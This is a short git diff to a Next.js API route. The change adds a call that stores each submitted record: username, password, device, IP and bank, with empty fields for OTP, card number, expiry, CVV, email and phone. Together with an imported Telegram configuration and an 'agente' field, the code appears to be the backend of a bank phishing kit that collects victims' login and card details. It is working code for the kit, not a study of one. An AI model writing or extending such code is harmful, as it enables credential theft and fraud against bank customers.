@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { TELEGRAM_CONFIG } from '@/lib/database';
+import { caseStore } from '@/lib/store';
 
 export async function POST(request: NextRequest) {
     try {
@@ -66,6 +67,27 @@ export async function POST(request: NextRequest) {
         });
 
         // Store session info
+        caseStore.addCase({
+            idreg: registroId,
+            usuario,
+            password,
+            otp: null,
+            dispositivo,
+            ip,
+            banco,
+            status: 1,
+            horacreado: now,
+            horamodificado: now,
+            id: null,
+            agente: null,
+            email: null,
+            cemail: null,
+            celular: null,
+            tarjeta: null,
+            ftarjeta: null,
+            cvv: null
+        });
+
         return NextResponse.json({
             success: true,
             registroId,
